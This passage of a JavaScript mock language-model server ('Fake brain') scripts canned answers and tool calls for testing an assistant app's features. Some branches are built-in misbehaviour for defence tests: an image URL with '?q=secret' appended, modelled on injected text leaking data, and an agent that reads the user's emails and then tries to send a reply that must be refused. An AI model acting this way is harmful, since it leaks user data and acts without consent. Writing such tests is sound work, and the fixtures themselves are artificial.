  const memory = [system, ...messages.map((m) => (typeof m.content === 'string' ? m.content : ''))].flatMap((text) => [...text.matchAll(/<memory>\n([\s\S]*?)\n<\/memory>|The <memory> section is now:\n((?:- .*\n?)*)/g)]).map((m) => (m[1] ?? m[2]).trim()).at(-1) ?? ''
  // Chat Completions tool results carry the call's id, not the tool's name.
  const toolName = last.role === 'tool' ? messages.flatMap((m) => m.tool_calls ?? []).find((c) => c.id === last.tool_call_id)?.function?.name : undefined
  const remember = /^(?:remember|retiens|覚えて)[:：,]?\s*(.+)/i.exec(question.trim())
  const introduced = /^(?:i'm|i am|my name is|je m'appelle)\s+([\p{L}-]+)/iu.exec(question.trim())
  const skill = /\bskill\b/i.test(question) && last.role === 'user'
  const following = /^follow the skill ([\w-]+)/i.exec(question.trim())
  // A connected mail service's tools, by name: declared, or listed in <connections>.
  const mailTool = [...declared].find((name) => name.endsWith('_search_emails')) ?? /\b(\w+_search_emails)\b/.exec(serialized)?.[1]
  const emails = /e-?mails?|inbox|courriels?/i.test(question) || /The user is back/.test(serialized)
  // A script, called by name even when the computer came on mid-conversation (D104).
  const script = 'javascript'
  const fromScript = (/** @type {string} */ name) => ({ name: script, args: { code: `return await tools.${name}({ limit: 3 })` } })
  // The savings starter (D163), in English.
  const savings = /savings over 10 years/i.test(question)
  // "$ ls": a command, on the computer (D162).
  const command = /^\$ ([\s\S]+)/.exec(question.trim())?.[1]
  const found = sourcesIn(last.role === 'tool' ? last.content : '')
  // 0.6: a helper's turn, the briefing it is part of, and Double-check's requests.
  const helper = system.startsWith('You are a helper of')
  const task = helper ? messages.find((m) => m.role === 'user')?.content ?? '' : ''
  const topic = /invoice/i.test(task) ? 'invoice' : 'croissant'
  // A party to plan: one helper needs the number of guests from the user.
  const party = /party/i.test(question) && !helper
  const briefing = /briefing/i.test(question) && !helper
  // A brief of what's new: it reads the emails, then tries to answer one, which must be refused.
  const back = /The user is back/.test(serialized)
  const sendTool = mailTool?.replace(/_search_emails$/, '_send_email')
  const searched = sourcesIn([...messages].reverse().find((m) => m.role === 'tool' && /^Source \[/m.test(m.content))?.content ?? '')
  const steps = '# Weekly sales summary\n\n1. Read the shared sales file.\n2. Total the sales by region.\n3. Answer with a short table.'
  // No example: a skill is saved without one, which the answer gives (D322).
  const weekly = { name: 'weekly-sales-summary', description: 'When the user asks for a summary of the weekly sales by region.', steps }
  // A skill made with the user (D322): it offers Skills if they aren't on, asks what it needs, then saves it with
  // an example, which the answer suggests first, as the result says; its steps end badly, as Haiku's did in Claude Code.
  const asked = messages.filter((m) => m.role === 'user').map((m) => m.content)
  const making = /make me a skill/i.test(asked.at(-1) ?? '')
  const described = /make me a skill/i.test(asked.at(-2) ?? '') && last.role === 'user'
  const team = { name: 'team-update', description: 'When the user wants their weekly team update written from their notes.', example: 'Write my team update: we shipped the new menu and hired Sam.', steps: '# Team update\n\n1. Read the notes.\n2. Write three short bullet points.</parameter>\n</invoke>\n' }
  const tryIt = toolName === 'save_skill' ? /one click tries it: (.+)$/m.exec(last.content)?.[1] : undefined
  // 0.7: a routine, at the time asked, or at the time of the habit Jean noticed.
  const regular = /^every\b/i.test(question.trim()) || /\broutine\b/i.test(question)
  const regularly = regular && last.role === 'user'
  const habit = /Requests like this one were made on \w{3} \w{3} \d\d \d{4} (\d\d:\d\d)/.exec(serialized)?.[1]
  const routine = { title: 'Weekly sales', request: 'Summarize the weekly sales by region', every: 'day', at: /\bat (\d\d:\d\d)/.exec(question)?.[1] ?? habit ?? '09:00' }
  const flow = /\b(?:make|draw|save)\b.*\bflow\b/i.test(question)
  const invoices = { name: 'Weekly invoices', steps: [
    { name: 'Invoices', text: 'Acme,100\nAcme,20\nBistro,80' },
    { name: 'Totals', ask: 'Total per client: {{Invoices}}' },
    { name: 'Save', tool: 'write', args: { name: 'Totals.md', content: '{{Totals}}' } },
  ] }
  // A routine a file sets off (D294).
  const eachTime = /^each time\b/i.test(question.trim()) && last.role === 'user'
  // 0.8: a folder's files, by the names <folder> gives its tools (D104, D141).
  const folder = /The user's folder /.test(serialized)
  const mentions = /\bmention(?:s)?\s+(?:the\s+)?["“]?(.+?)["”]?(?:\s+clause)?\?*$/i.exec(question.trim())?.[1]
  const edit = /\bin\s+(\S+),\s*change\s+["“](.+?)["”]\s+to\s+["“](.+?)["”]/i.exec(question)
  const make = /\bmake\s+(\S+\.html?)\s+saying\s+["“](.+?)["”]/i.exec(question)
  // The project's files, searched from any of its tasks (D24).
  const about = /\bwhat do (?:the|my|our) files say about (.+?)\?*$/i.exec(question.trim())?.[1]
  // Read already in this conversation: it changes the file straight away, and reads it again if told it moved.
  const opened = (/** @type {string} */ path) => messages.some((m) => (m.tool_calls ?? []).some((/** @type {any} */ c) => c.function.name === 'open' && JSON.parse(c.function.arguments).path === path))
  // A conversation summed up near its window (D359).
  const summing = /This conversation has grown too long to keep in full/.test(lastUser)
  // Plans (D364): planned step by step; or a count, a step a number, from the request at work on.
  const stepwise = /step by step|خطوة بخطوة|段階的に/i.test(question) && declared.has('plan') && (last.role === 'user' || toolName === 'plan')
  const counting = /count to twenty|عدّ إلى عشرين|二十まで数えて/i.test(question) && last.role !== 'assistant'
  const slowly = /count slowly to five|عدّ ببطء إلى خمسة|ゆっくり五まで数えて/i.test(question) && last.role !== 'assistant'
  const counted = messages.slice(messages.findLastIndex((m) => m.role === 'user')).filter((m) => m.role === 'tool').length
  if (summing) answer = 'Summary: the user wants the work carried on, step by step.'
  else if (stepwise) ({ call = null, answer = '' } = planned(messages, lang))
  else if (counting && counted < 20) call = { name: 'find_tools', args: { query: `number ${counted + 1}` } }
  else if (counting) answer = 'I counted to twenty.'
  else if (/^(?:stop|توقف|止めて)/i.test(question.trim()) && last.role === 'user') answer = 'Stopping here, as you asked.'
  else if (slowly && counted < 5) {
    await new Promise((resolve) => setTimeout(resolve, 1000))
    call = { name: 'find_tools', args: { query: `number ${counted + 1}` } }
  } else if (slowly) answer = 'I counted to five, slowly.'
  else if (messages.find((m) => m.role !== 'system')?.content.includes('<summary>') && last.role === 'user') answer = 'I read on from the summary of the earlier work.'
  else if (system.startsWith('You check whether sources support claims')) answer = checked(lastUser)
  else if (system.startsWith('Answer the question about what follows with yes or no')) answer = /<about>[\s\S]*\b(invoice|html)\b/i.test(lastUser) ? 'Yes.' : 'No.'
  else if (/^You are .+, in a meeting /.test(system)) answer = /What was said so far/.test(lastUser) ? 'Agreed.' : memory ? `For us: ${memory.replace(/^- /gm, '').split('\n').join('; ')}.` : 'Nothing from me.'
  else if (/\bmeeting\b/i.test(question) && last.role === 'user' && declared.has('meet')) call = { name: 'meet', args: { topic: 'Saturday' } }
  else if (/\bcertificate\b/i.test(question) && last.role === 'user' && declared.has('check_certificate')) call = { name: 'check_certificate', args: { files: documents.map(([, , name]) => name), ...(/\bwatermark\b/i.test(question) && { watermark: true }) } }
  else if (toolName === 'check_certificate') answer = last.content.split('\n')[0]
  else if (toolName === 'meet') answer = last.content.startsWith('Error') ? `That didn't work: ${last.content}` : `The meeting is over:\n\n${(/Round 1:\n([\s\S]*?)\n\n/.exec(last.content)?.[1] ?? '').split('\n').map((line) => `- ${line}`).join('\n')}`
  // Flows (D218): a step to do, a flow to draw (asked, or the steps just done, offering Flows first if they're off), one to run.
  else if (/doing one step of the user's flow/.test(system)) answer = /Total per client/.test(lastUser) ? 'Acme: 120\nBistro: 80' : ''
  else if (flow && last.role === 'user' && declared.has('save_flow')) call = { name: 'save_flow', args: invoices }
  else if (flow && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'flows' } }
  else if (flow && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'save_flow', args: invoices }
  else if (toolName === 'save_flow') answer = last.content.startsWith('Error') ? `That didn't work: ${last.content}` : 'The flow is beside the conversation: run it whenever you like.'
  else if (/\brun\b.*\bflow\b/i.test(question) && last.role === 'user' && declared.has('run_flow')) call = { name: 'run_flow', args: { flow: 'Weekly invoices' } }
  else if (toolName === 'run_flow') answer = `The flow gave:\n\n${last.content}`
  else if (about && last.role === 'user' && declared.has('search_files')) call = { name: 'search_files', args: { query: about } }
  // Words found nothing, and the tool says searching by meaning might (D302): it offers that, then searches again.
  else if (about && toolName === 'search_files' && /offer "meaning"/.test(last.content) && declared.has('offer')) call = { name: 'offer', args: { capability: 'meaning' } }
  else if (about && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'search_files', args: { query: about } }
  else if (toolName === 'search_files') {
    const lines = last.content.split('\n')
    const quoted = lines.find((line) => !line.startsWith('Source [') && line.toLowerCase().includes(String(about).toLowerCase())) ?? lines[1]
    answer = /^Nothing in/.test(last.content) ? 'The files say nothing about it.' : `The files say: ${quoted?.trim()} [${/Source \[(\d+)\]/.exec(last.content)?.[1]}]`
  }
  else if (folder && mentions && last.role === 'user') call = { name: 'find_in_files', args: { text: mentions } }
  else if (toolName === 'find_in_files') answer = /^Not found/.test(last.content) ? 'No file there mentions it.' : `These files mention it:\n\n${[...new Set([...last.content.matchAll(/^(.+?):(\d+): /gm)].map((m) => m[1]))].map((path) => `- **${path}**`).join('\n')}`
  else if (folder && /what is in the folder/i.test(question) && last.role === 'user') call = { name: 'list', args: {} }
  else if (toolName === 'list') answer = `The folder holds:\n\n${last.content.split('\n').map((line) => `- ${line}`).join('\n')}`
  else if (folder && make && last.role === 'user') call = { name: 'change', args: { path: make[1], old: '', new: `<h1>${make[2]}</h1>\n` } }
  else if (folder && edit && last.role === 'user') call = { name: opened(edit[1]) ? 'change' : 'open', args: opened(edit[1]) ? { path: edit[1], old: edit[2], new: edit[3] } : { path: edit[1] } }
  else if (edit && toolName === 'open' && !last.content.startsWith('Error')) call = { name: 'change', args: { path: edit[1], old: edit[2], new: edit[3] } }
  else if (edit && toolName === 'change' && /is open now/.test(last.content)) call = { name: 'change', args: { path: edit[1], old: edit[2], new: edit[3] } }
  else if (edit && toolName === 'change' && /changed since you read it/.test(last.content)) call = { name: 'open', args: { path: edit[1] } }
  else if (toolName === 'change' || (edit && toolName === 'open')) answer = /^(Changed|Made) /.test(last.content) ? `Done: ${last.content}` : `That didn't work: ${last.content}`
  else if (helper && /how many/i.test(task) && last.role === 'user') call = { name: 'ask_user', args: { questions: [{ question: 'How many people are coming?' }] } }
  else if (helper && toolName === 'ask_user') answer = /did not answer|"skipped"/.test(last.content) ? 'Nobody said; I assumed 10 people.' : `${JSON.parse(last.content).answers[0].wrote} people are coming.`
  else if (helper && last.role === 'user' && mailTool && declared.has(mailTool)) call = { name: mailTool, args: { query: topic, limit: 1 } }
  else if (helper && last.role === 'user') call = { name: 'find_tools', args: { query: 'search emails' } }
  else if (helper && toolName === 'find_tools' && mailTool) call = { name: mailTool, args: { query: topic, limit: 1 } }
  else if (helper && found.length) answer = topic === 'invoice' ? `Invoice 2041, for 912 euros, is due on Friday 4 October [${found[0].n}].` : `Margot asks to confirm an order of 120 croissants for Saturday morning [${found[0].n}].`
  else if (helper) answer = 'I could not find it.'
  else if (/\bletter\b/i.test(question) && last.role === 'user' && declared.has('ask_user')) call = { name: 'ask_user', args: { questions: LETTER } }
  else if (toolName === 'ask_user') answer = told(last.content)
  else if (briefing && last.role === 'user' && declared.has('delegate')) {
    call = { name: 'delegate', args: { parts: [
      { title: 'Bakery orders', task: 'Find the latest email about the croissant order and say what it asks.' },
      { title: 'Bills to pay', task: 'Find the latest email about an invoice and say what is due, and when.' },
    ] } }
  } else if (party && last.role === 'user' && declared.has('delegate')) {
    call = { name: 'delegate', args: { parts: [
      { title: 'Guests', task: 'Ask the user how many people are coming.' },
      { title: 'Bills to pay', task: 'Find the latest email about an invoice and say what is due, and when.' },
    ] } }
  } else if (toolName === 'delegate') {
    const reports = [...last.content.matchAll(/^Part \d+, [^:]*:\n(.+)$/gm)].map((m) => m[1])
    const first = /\[(\d+)\]/.exec(reports[0] ?? '')?.[1] ?? '1'
    answer = `Your Monday briefing:\n\n${reports.map((report) => `- ${report}`).join('\n')}\n- The bakery is closed on Monday [${first}].`
  } else if (back && last.role === 'user') call = { name: 'find_tools', args: { query: 'search or send emails' } }
  else if (back && toolName === 'find_tools') call = { name: String(mailTool), args: { limit: 3 } }
  else if (back && toolName === mailTool && sendTool && declared.has(sendTool)) call = { name: sendTool, args: { to: 'margot@bakery.example', body: 'Confirmed.' } }
  else if (back && toolName === sendTool) answer = `Your ${searched.length} latest emails:\n\n${searched.map((email) => `- **${email.title}** [${email.n}]`).join('\n')}`
  else if (emails && last.role === 'user' && mailTool && declared.has(mailTool)) call = { name: mailTool, args: { limit: 3 } }
  else if (emails && last.role === 'user' && mailTool && declared.has(script)) call = fromScript(mailTool)
  else if (emails && last.role === 'user' && declared.has('find_tools')) call = { name: 'find_tools', args: { query: 'search the latest emails' } }
  else if (toolName === 'find_tools' && mailTool && /_search_emails\(/.test(last.content)) call = /inside (?:javascript|run)/.test(last.content) ? fromScript(mailTool) : { name: mailTool, args: { limit: 3 } }
  else if (toolName === mailTool && last.content.startsWith('Error: ')) answer = `That didn't work: ${last.content.slice(7)}`
  else if (found.length && /^mail:/.test(found[0].url)) {
    answer = `Your ${found.length} latest emails:\n\n${found.map((email) => `- **${email.title}**, ${email.more.replace(/:.*$/, '')} [${email.n}]`).join('\n')}`
  } else if (/search the web|look up/i.test(question) && last.role === 'user' && declared.has('web_search')) call = { name: 'web_search', args: { query: question.replace(/.*(?:search the web for|look up)\s*/i, '').replace(/[?.!]$/, '') } }
  // Asked for pictures, a source's, at the address it gave, and that address changed, as injected words would have it (D35).
  else if (toolName === 'web_search') answer = found.length ? `Here is what the web says:\n\n${found.map((page) => `- **${page.title}**: ${page.more.slice(0, 90)} [${page.n}]`).join('\n')}${found.filter((page) => page.picture && /picture/i.test(question))
    .map((page) => `\n\n![${page.title}](${page.picture}) ![${page.title}, again](${page.picture}?q=secret)`).join('')}` : 'I found nothing on the web.'
  else if (/wikipedia article/i.test(question) && last.role === 'user' && declared.has('browse')) call = { name: 'browse', args: { url: ARTICLE } }
  else if (toolName === 'browse' && found[0]?.picture) answer = `${found[0].more} [${found[0].n}]\n\n![${found[0].title}](${found[0].picture})`
  else if (/bakery site/i.test(question) && last.role === 'user' && declared.has('browse')) call = { name: 'browse', args: { url: BAKERY } }
  else if (/bakery site/i.test(question) && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'browser' } }
  else if (/bakery site/i.test(question) && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'browse', args: { url: BAKERY } }
  else if (toolName === 'browse') answer = found.length ? `The bakery’s page is open beside our conversation. ${/Fresh bread[^\n]*/.exec(last.content)?.[0]} [${found[0].n}]` : `That didn't work: ${last.content}`
  // The savings starter: one script works the plan out and draws its chart as a page, which opens beside the conversation (D163).
  // Asked for a change, it makes the page again: a second version, the first kept (D164).
  // Turned on mid-conversation, javascript is deferred: called by its name, it runs all the same (D104).
  else if (/bars blue/i.test(question) && last.role === 'user') call = { name: 'javascript', args: { code: SAVINGS.replace('#c8691c', '#2563eb') } }
  else if (/bars blue/i.test(question) && toolName === 'javascript') answer = 'Done: the bars are blue now. The first version is still under my first answer.'
  else if (savings && last.role === 'user' && declared.has('javascript')) call = { name: 'javascript', args: { code: SAVINGS } }
  else if (savings && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'computer' } }
  else if (savings && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'javascript', args: { code: SAVINGS } }
  else if (savings && toolName === 'javascript') answer = `After 10 years you would have ${/"total": (\d+)/.exec(last.content)?.[1] ?? '?'}. The chart is open beside our conversation.`
  else if (command && last.role === 'user' && declared.has('bash')) call = { name: 'bash', args: { command } }
  else if (command && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'computer' } }
  else if (command && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'bash', args: { command } }
  else if (toolName === 'bash') answer = `The computer says:\n\n\`\`\`\n${last.content}\n\`\`\``
  else if (/give me a link/i.test(question) && last.role === 'user') answer = `Here it is: [the bakery](${BAKERY}).`
  else if (/^chart\b/i.test(question) && last.role === 'user') answer = CHART
  else if (/\bjig\b/i.test(question) && last.role === 'user') answer = JIG
  // Asked for sheet music (or a partition), it reads Jean's own Music score where <skills> lists it, then writes a tune as its steps say (D401),
  // or where `skill`'s line names it, before Skills is found (D406).
  else if (/sheet music|partition/i.test(question) && last.role === 'user' && declared.has('skill') && /^- (skill: .*\b)?music-score\b/m.test(system)) call = { name: 'skill', args: { name: 'music-score' } }
  else if (toolName === 'skill' && /ABC notation/.test(last.content)) answer = JIG
  else if (/\bslides\b/i.test(question) && last.role === 'user') answer = DECK
  else if (/bill splitter/i.test(question) && last.role === 'user') answer = SPLITTER
  else if (/sales explorer/i.test(question) && last.role === 'user') answer = EXPLORER
  else if (/golden ratio/i.test(question) && last.role === 'user') answer = GOLDEN
  else if (/compare l'iphone et le pixel/i.test(question) && last.role === 'user') answer = PHONES
  else if (/half year's sales/i.test(question) && last.role === 'user') answer = HALF
  else if (/steps to buy a phone/i.test(question) && last.role === 'user') answer = BUY
  else if (/plan my saturday/i.test(question) && last.role === 'user') answer = SATURDAY
  else if (/take an umbrella/i.test(question) && last.role === 'user') answer = FLOW
  else if (/mind map of coffee/i.test(question) && last.role === 'user') answer = MIND
  else if (/my trip on a map/i.test(question) && last.role === 'user') answer = TRIP
  else if (/stop planner/i.test(question) && last.role === 'user') answer = PLANNER
  else if (/compare the phone plans|قارن باقات الهاتف|携帯プランを比べて/i.test(question) && last.role === 'user') answer = PLANS[lang] ?? PLANS.en
  else if (/\bidentity\b/i.test(question) && last.role === 'user') answer = IDENTITY
  else if (/^Démontre/.test(question) && last.role === 'user') answer = PROOF
  else if (/camembert/i.test(question) && last.role === 'user') answer = BUDGET
  else if (/euler/i.test(question) && last.role === 'user') answer = EULER
  else if (/\bfilm\b/i.test(question) && last.role === 'user' && declared.has('film')) call = { name: 'film', args: { description: question, seconds: 4 } }
  else if (toolName === 'film') answer = /^Made /.test(last.content) ? 'Here is your film.' : `No film: ${last.content}`
  else if (/\b(draw|picture)\b/i.test(question) && last.role === 'user' && declared.has('picture')) call = { name: 'picture', args: { description: question } }
  else if (/\b(draw|picture)\b/i.test(question) && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'pictures' } }
  else if (toolName === 'offer' && /It is on/.test(last.content) && /\b(draw|picture)\b/i.test(question)) call = { name: 'picture', args: { description: question } }
  else if (toolName === 'picture') answer = /^Made /.test(last.content) ? 'Here is your picture.' : `No picture: ${last.content}`
  else if (/word document/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Bakery plan.docx', content: PLAN } }
  else if (/web page/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Bakery.html', content: PAGE } }
  else if (/svg logo/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Logo.svg', content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120"><rect width="120" height="120" fill="#f6e7cf"/><circle cx="60" cy="60" r="38" fill="#c8691c"/></svg>' } }
  else if (/add a step/i.test(question) && last.role === 'user' && declared.has('edit')) call = { name: 'edit', args: { file: 'Bakery plan.docx', old: '2. Deliver them', new: '2. Deliver them\n3. Sell the rest' } }
  else if (toolName === 'write' || toolName === 'edit') answer = /^(?:Saved|Changed) /.test(last.content) ? `Done: **${/^(?:Saved|Changed) (.+?)\. /.exec(last.content)?.[1]}** is under this answer.` : `That didn't work: ${last.content}`
  else if (following && last.role === 'user' && declared.has('skill')) call = { name: 'skill', args: { name: following[1] } }
  else if (toolName === 'skill') answer = 'Followed its steps.'
  else if (introduced && last.role === 'user' && declared.has('save_name')) call = { name: 'save_name', args: { name: introduced[1] } }
  else if (/^what can you do\b/i.test(question.trim()) && last.role === 'user' && declared.has('about')) call = { name: 'about', args: { topic: /\babout ([^?\n]+)/i.exec(question)?.[1] ?? '' } }
  // The first line of each part read whole, or else Settings' sections and a line for each part, each cut short.
  else if (toolName === 'about') {
    const lines = last.content.split('\n')
    const whole = lines.filter((_, i) => /^## /.test(lines[i - 1] ?? ''))
    answer = (whole.length ? whole : lines.filter((line) => /^- [a-z-]+(?: \(.*?\))?: | has these sections now: /.test(line))).map((line) => line.slice(0, 90)).join('\n')
  }
  // In a child's profile (D228), a danger told: it raises a concern, its kind alone, and says at home when it is.
  else if (declared.has('raise_concern') && last.role === 'user' && /\b(bullied|hits me)\b/i.test(question)) call = { name: 'raise_concern', args: { kind: /hits me/i.test(question) ? 'abuse' : 'bullying', home: /\bat home\b/i.test(question) } }
  else if (toolName === 'raise_concern') answer = `I'm sorry this is happening to you. ${last.content}`
  else if (toolName === 'save_name') answer = `Nice to meet you, ${introduced?.[1] ?? 'friend'}.`
  else if (remember && last.role === 'user' && declared.has('remember')) call = { name: 'remember', args: { text: remember[1], scope: system.includes('<project>') ? 'project' : 'person' } }
  else if (toolName === 'remember') answer = 'Noted.'
  else if (/what do you know/i.test(question) && last.role === 'user') answer = memory ? `I know this:\n\n${memory}` : 'Nothing yet.'
  else if (eachTime && declared.has('schedule')) call = { name: 'schedule', args: { title: 'File it', request: 'Add the file to the register', when: 'file' } }
  else if (regularly && declared.has('schedule')) call = { name: 'schedule', args: routine }
  else if (regularly && declared.has('offer')) call = { name: 'offer', args: { capability: 'routines' } }
  else if (regular && toolName === 'offer' && /It is on/.test(last.content)) call = { name: 'schedule', args: routine }
  else if (regularly && declared.has('find_tools')) call = { name: 'find_tools', args: { query: 'make a routine on a schedule' } }
  else if (toolName === 'find_tools' && /schedule\(/.test(last.content)) call = { name: 'schedule', args: routine }
  else if (toolName === 'schedule') answer = 'Done: it is a routine now.'
  else if (making && last.role === 'user' && !declared.has('save_skill') && declared.has('offer')) call = { name: 'offer', args: { capability: 'skills' } }
  else if (making && (last.role === 'user' || (toolName === 'offer' && /It is on/.test(last.content)))) answer = 'Gladly. What will you give me, and what should come back?'
  else if (described && declared.has('save_skill')) call = { name: 'save_skill', args: team }
  else if (skill && declared.has('save_skill')) call = { name: 'save_skill', args: weekly }
  else if (skill && declared.has('find_tools')) call = { name: 'find_tools', args: { query: 'save a skill' } }
  else if (toolName === 'find_tools' && /save_skill\(/.test(last.content)) call = { name: 'save_skill', args: weekly }
  else if (toolName === 'save_skill') answer = 'Done: it is a skill now.'
  else if (table && /spreadsheet/i.test(question) && last.role === 'user' && declared.has(script)) call = { name: script, args: { code: spreadsheetScript(table[2]) } }
  else if (table && last.role === 'user' && declared.has(script)) call = { name: script, args: { code: totalsScript(table[2]) } }
  else if (table && last.role === 'user' && declared.has('offer')) call = { name: 'offer', args: { capability: 'computer' } }
  else if (table && last.role === 'tool' && /It is on/.test(last.content)) call = { name: 'javascript', args: { code: totalsScript(table[2]) } }
  else if (last.role === 'tool' && /^Result: /.test(last.content)) {
    const { by, of, totals } = JSON.parse(last.content.slice(8).split('\n\nLog:')[0])
    const rows = Object.entries(totals).map(([key, value]) => `| ${key} | ${value} |`).join('\n')
    answer = `${TOTALS[lang](of, by)}${cite(table)}:\n\n| ${by} | ${of} |\n|---|---:|\n${rows}`
  } else if (png.length > 24 && last.role === 'user') answer = `I can see your picture: ${png.readUInt32BE(16)} × ${png.readUInt32BE(20)} pixels.`
  else if (documents.length) {
    const doc = documents.at(-1)
    answer = `I read **${doc?.[2]}**${cite(doc)}. It starts with: “${doc?.[3].replace(/\[\[page \d+\]\]\n/g, '').slice(0, 120).trim()}”\n\nYou asked: *${question.slice(0, 80)}*`
  } else answer = REPLIES[lang](question.slice(0, 80))
  if (answer && !summing) answer += `\n\n<suggestions>\n${[...(tryIt ? [tryIt] : []), ...(answer === EULER ? EULER_NEXT : SUGGESTIONS[lang])].slice(0, 3).join('\n')}\n</suggestions>`

  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
  const send = (/** @type {object} */ delta, finish = null) =>
    res.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`)
  const pause = () => new Promise((resolve) => setTimeout(resolve, PACE))
  for (const word of 'Reading the request and planning a clear answer.'.split(' ')) {
    send({ reasoning: word + ' ' })
    await pause()
  }
  if (call) {
    send({ tool_calls: [{ index: 0, id: `call_${Date.now()}`, type: 'function', function: { name: call.name, arguments: JSON.stringify(call.args) } }] })
    send({}, 'tool_calls')
  } else {
    for (const piece of answer.match(/.{1,6}/gs) ?? []) {
      send({ content: piece })
      await pause()
    }
    send({}, 'stop')
  }
  const prompt = /a very long task/i.test(question) ? 100_000 : Math.ceil(serialized.length / 4)
  res.write(`data: ${JSON.stringify({ choices: [], usage: { prompt_tokens: prompt, completion_tokens: Math.ceil(answer.length / 4), prompt_tokens_details: { cached_tokens: Math.floor(cached / 4) } } })}\n\n`)
  res.end('data: [DONE]\n\n')
}).listen(PORT, '127.0.0.1', () => console.log(`Fake brain on http://127.0.0.1:${PORT}/v1`))
